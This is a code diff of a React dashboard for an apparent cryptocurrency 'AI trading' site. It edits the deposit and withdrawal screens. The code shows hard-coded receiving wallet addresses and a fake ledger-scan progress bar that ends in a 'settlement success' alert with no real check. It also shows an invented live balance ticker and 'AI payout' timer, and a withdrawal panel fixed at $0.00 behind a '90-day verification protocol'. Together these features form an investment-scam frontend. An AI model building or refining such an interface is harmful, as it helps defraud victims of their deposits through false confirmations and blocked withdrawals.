@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect } from 'react';
 import { User, TradeLog, CryptoPrice } from '../types';
 import { Wallet, History, TrendingUp, Share2, Timer, CheckCircle2, Lock, Unlock, BarChart3, ChevronDown, Loader2, ScanLine, ArrowDownCircle, AlertCircle, Users, Copy } from 'lucide-react';
@@ -27,15 +26,13 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
   const [marketPrices, setMarketPrices] = useState<CryptoPrice[]>([]);
   const [liveDisplayBalance, setLiveDisplayBalance] = useState(user.balance);
 
-  // YOUR ACTUAL RECEIVING ADDRESSES
   const RECEIVING_ADDRESSES: Record<string, string> = {
-    USDT: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", // BSC Address
+    USDT: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
     BTC: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
     ETH: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
     BNB: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
   };
 
-  // Live Ticker Logic
   useEffect(() => {
     setLiveDisplayBalance(user.balance);
     if (user.depositedAmount > 0) {
@@ -144,7 +141,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
     setIsScanning(false);
     setShowPaymentGateway(false);
     setDepositAmountUSD('100');
-    alert(`AUTOMATIC SETTLEMENT SUCCESS: ${cryptoEquivalent} ${selectedCoin} confirmed on-chain. Your trading principal has been credited.`);
+    alert(`AUTOMATIC SETTLEMENT SUCCESS: ${cryptoEquivalent} ${selectedCoin} confirmed. Principal credited.`);
   };
 
   const handleWithdrawal = () => {
@@ -153,7 +150,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
-    alert("Address copied to clipboard!");
+    alert("Address copied!");
   };
 
   return (
@@ -167,13 +164,12 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
           sub="Real-time Ticker" 
           highlight
         />
-        <StatCard label="Next AI Payout" value={Math.floor(nextProfitIn / 60) + ":" + (nextProfitIn % 60).toString().padStart(2, '0')} icon={<Timer className="text-blue-500" size={32} />} sub="Strategy Execution" />
+        <StatCard label="Next AI Payout" value={Math.floor(nextProfitIn / 60) + ":" + (nextProfitIn % 60).toString().padStart(2, '0')} icon={<Timer className="text-blue-500" size={32} />} sub="Neural Strategy" />
         <StatCard label="Vault Address" value={user.walletAddress.substring(0, 6) + "..." + user.walletAddress.substring(36)} icon={<Wallet className="text-[#F0B90B]" size={32} />} sub="Unique Identity" />
       </div>
 
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-12">
         <div className="lg:col-span-2 flex flex-col gap-12">
-          {/* Main Batches Section */}
           <div className="bg-[#1e2329] p-12 rounded-[3.5rem] border-4 border-[#2b2f36] shadow-2xl">
             <h3 className="text-4xl font-black mb-10 flex items-center gap-4 uppercase tracking-tighter"><Unlock size={40} className="text-[#F0B90B]" /> Neural Staking Batches</h3>
             <div className="space-y-6">
@@ -188,46 +184,44 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
                     <div className="text-2xl font-black text-blue-500">{new Date(batch.unlockDate).toLocaleDateString()}</div>
                   </div>
                 </div>
-              )) : <div className="text-center py-20 text-[#848e9c] text-3xl italic font-black opacity-20 uppercase tracking-[0.2em]">Searching for active deposits...</div>}
+              )) : <div className="text-center py-20 text-[#848e9c] text-3xl italic font-black opacity-20 uppercase tracking-[0.2em]">No active deposits detected...</div>}
             </div>
           </div>
 
-          {/* Restored Withdrawal Section */}
-          <div className="bg-[#1e2329] p-12 rounded-[3.5rem] border-4 border-[#2b2f36] shadow-2xl relative overflow-hidden">
-             <div className="absolute top-0 right-0 p-10 opacity-5 -rotate-12"><ArrowDownCircle size={240} /></div>
+          {/* Restored Withdrawal Section with Max Visibility */}
+          <div className="bg-[#1e2329] p-12 rounded-[3.5rem] border-4 border-[#2b2f36] shadow-2xl relative overflow-hidden group hover:border-[#F0B90B] transition-all">
+             <div className="absolute top-0 right-0 p-10 opacity-5 -rotate-12 group-hover:scale-110 transition-transform"><ArrowDownCircle size={240} /></div>
              <h3 className="text-4xl font-black mb-10 flex items-center gap-4 uppercase tracking-tighter"><ArrowDownCircle size={40} className="text-[#F0B90B]" /> Withdrawal Portal</h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-10">
                 <div className="bg-[#0b0e11] p-10 rounded-3xl border-2 border-[#2b2f36] flex flex-col gap-4">
-                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Available Earnings</span>
+                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Available for Exit</span>
                    <span className="text-5xl font-black text-white">$0.00</span>
-                   <span className="text-[10px] text-red-500 uppercase font-black">Locked in current cycle</span>
+                   <span className="text-[10px] text-red-500 uppercase font-black font-mono">Consolidating in TRC20 Vault</span>
                 </div>
                 <div className="bg-[#0b0e11] p-10 rounded-3xl border-2 border-[#2b2f36] flex flex-col gap-4">
-                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Locked Principal</span>
+                   <span className="text-[#848e9c] uppercase text-xs font-black tracking-widest">Neural Balance</span>
                    <span className="text-5xl font-black text-[#F0B90B]">${user.balance.toLocaleString(undefined, {minimumFractionDigits: 2})}</span>
-                   <span className="text-[10px] text-blue-500 uppercase font-black">Consolidating in TRC20 Vault</span>
+                   <span className="text-[10px] text-blue-500 uppercase font-black font-mono">2026 Profit Target Enabled</span>
                 </div>
              </div>
              <button 
                 onClick={handleWithdrawal}
-                className="w-full bg-white text-black py-8 rounded-[2.5rem] font-black text-3xl hover:bg-[#F0B90B] transition-all flex items-center justify-center gap-4 uppercase shadow-[0_10px_40px_rgba(255,255,255,0.1)] active:scale-95"
+                className="w-full bg-[#F0B90B] text-black py-8 rounded-[2.5rem] font-black text-3xl hover:bg-white transition-all flex items-center justify-center gap-4 uppercase shadow-2xl active:scale-95"
              >
-                <AlertCircle /> Process Withdrawal Request
+                <AlertCircle /> Process Withdrawal Portal
              </button>
-             <p className="text-center mt-6 text-xs text-[#848e9c] font-black uppercase tracking-[0.3em] opacity-40">Mandatory 90-day verification protocol active</p>
+             <p className="text-center mt-6 text-xs text-[#848e9c] font-black uppercase tracking-[0.3em] opacity-40 italic">Mandatory 90-day verification protocol active</p>
           </div>
         </div>
 
         <div className="flex flex-col gap-12">
-          {/* Automatic Payment Gateway Widget */}
           <div className="bg-[#F0B90B] p-12 rounded-[4rem] text-black shadow-2xl relative overflow-hidden">
             {!showPaymentGateway ? (
               <>
                 <h3 className="text-5xl font-black mb-2 uppercase tracking-tighter">Deposit</h3>
-                <p className="text-sm font-black mb-10 opacity-70 uppercase tracking-widest flex items-center gap-2">Institutional Entry Gateway <ScanLine size={16}/></p>
-                
+                <p className="text-sm font-black mb-10 opacity-70 uppercase tracking-widest flex items-center gap-2">Receiving Address Portal <ScanLine size={16}/></p>
                 <div className="flex flex-col gap-8">
-                  <div className="relative group">
+                  <div className="relative">
                     <select 
                       value={selectedCoin}
                       onChange={(e) => setSelectedCoin(e.target.value)}
@@ -240,48 +234,35 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
                     </select>
                     <ChevronDown className="absolute right-6 top-7 pointer-events-none" size={28} />
                   </div>
-
                   <div className="relative">
                     <input 
                       type="number" 
                       value={depositAmountUSD} 
                       onChange={(e) => setDepositAmountUSD(e.target.value)} 
-                      placeholder="100" 
-                      className="w-full bg-black/10 border-4 border-black/20 rounded-2xl p-8 text-5xl font-black outline-none focus:border-black transition-all placeholder:text-black/30" 
+                      className="w-full bg-black/10 border-4 border-black/20 rounded-2xl p-8 text-5xl font-black outline-none focus:border-black transition-all" 
                     />
                     <span className="absolute right-8 top-10 text-2xl font-black opacity-50">USD</span>
                   </div>
-
                   <div className="bg-black/5 p-6 rounded-2xl border-2 border-dashed border-black/20 text-center">
-                    <p className="text-xs font-black uppercase tracking-widest opacity-60 mb-2">Total {selectedCoin} Required</p>
+                    <p className="text-xs font-black uppercase tracking-widest opacity-60 mb-2">Required Amount</p>
                     <p className="text-3xl font-black">{cryptoEquivalent} {selectedCoin}</p>
                   </div>
-
-                  <button 
-                    onClick={handleStartPayment} 
-                    className="bg-black text-[#F0B90B] py-8 rounded-3xl font-black text-4xl hover:scale-105 transition-all shadow-2xl uppercase mt-4"
-                  >
-                    Start AI Trading
-                  </button>
-                  <p className="text-[10px] text-center font-black uppercase opacity-60 mt-2 italic">90-Day Automatic Consolidation Period Applies</p>
+                  <button onClick={handleStartPayment} className="bg-black text-[#F0B90B] py-8 rounded-3xl font-black text-4xl hover:scale-105 transition-all shadow-2xl uppercase mt-4">Show Address</button>
                 </div>
               </>
             ) : (
               <div className="flex flex-col items-center gap-10">
-                <div className="bg-white p-8 rounded-[3rem] shadow-2xl relative">
+                <div className="bg-white p-8 rounded-[3rem] shadow-2xl">
                   <img src={`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${RECEIVING_ADDRESSES[selectedCoin]}`} alt="QR" />
                 </div>
-                
                 <div className="text-center w-full">
                   <p className="text-4xl font-black uppercase">Send {cryptoEquivalent} {selectedCoin}</p>
                   <p className="text-[10px] font-black uppercase mt-2 opacity-60 tracking-[0.3em]">Protocol: {selectedCoin === 'USDT' || selectedCoin === 'BNB' ? 'BEP20 / BSC' : selectedCoin}</p>
                 </div>
-
-                <div className="w-full bg-black/10 p-8 rounded-3xl border-4 border-black/20 text-center font-mono text-xs break-all uppercase leading-tight relative group cursor-pointer" onClick={() => copyToClipboard(RECEIVING_ADDRESSES[selectedCoin])}>
+                <div className="w-full bg-black/10 p-8 rounded-3xl border-4 border-black/20 text-center font-mono text-xs break-all uppercase relative cursor-pointer" onClick={() => copyToClipboard(RECEIVING_ADDRESSES[selectedCoin])}>
                    <div className="flex items-center justify-center gap-2 mb-2 opacity-50"><Copy size={12} /> Click to Copy</div>
                    {RECEIVING_ADDRESSES[selectedCoin]}
                 </div>
-
                 <div className="w-full flex flex-col gap-4">
                   <div className="flex justify-between items-center text-xs font-black uppercase opacity-60">
                     <span>Awaiting Block Confirmation...</span>
@@ -291,19 +272,16 @@ export const Dashboard: React.FC<DashboardProps> = ({ user, setUser }) => {
                     <div className="h-full bg-black transition-all duration-300" style={{ width: `${scanProgress}%` }}></div>
                   </div>
                 </div>
-
                 <div className="flex items-center gap-4 text-sm font-black uppercase animate-pulse">
                   <Loader2 className="animate-spin" size={24} />
-                  Scanning Ledger Explorer
+                  Scanning Ledger Explorer...
                 </div>
-
-                <button onClick={() => setShowPaymentGateway(false)} className="text-black text-lg font-black uppercase underline decoration-4 underline-offset-8 hover:text-white transition-colors">Cancel Deposit</button>
+                <button onClick={() => setShowPaymentGateway(false)} className="text-black text-lg font-black uppercase underline decoration-4 underline-offset-8">Return</button>
               </div>
             )}
           </div>
-          
           <div className="bg-[#1e2329] p-10 rounded-[3rem] border-4 border-[#2b2f36] shadow-xl">
-            <h3 className="text-2xl font-black mb-8 flex items-center gap-3 text-[#F0B90B] uppercase"><BarChart3 size={32} /> Asset Pulse</h3>
+            <h3 className="text-2xl font-black mb-8 flex items-center gap-3 text-[#F0B90B] uppercase"><BarChart3 size={32} /> Market Pulse</h3>
             <div className="space-y-4">
               {marketPrices.map(coin => (
                 <div key={coin.symbol} className="flex justify-between items-center p-6 bg-[#0b0e11] rounded-[1.5rem] border-2 border-[#2b2f36]">
